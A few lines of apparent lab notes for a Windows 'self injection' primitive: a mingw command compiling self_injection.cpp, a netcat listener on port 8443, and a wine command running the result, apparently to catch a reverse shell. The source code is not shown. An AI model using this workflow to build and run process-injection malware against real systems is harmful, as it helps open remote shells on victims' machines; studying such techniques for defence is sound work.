//////////////////////////////////
// self injection basic primitive
///////////////////////////////////
x86_64-w64-mingw32-g++ self_injection.cpp -o self_injection.exe -luser32 -lkernel32 -static -std=c++26
nc -lvp 8443
wine self_injection.exe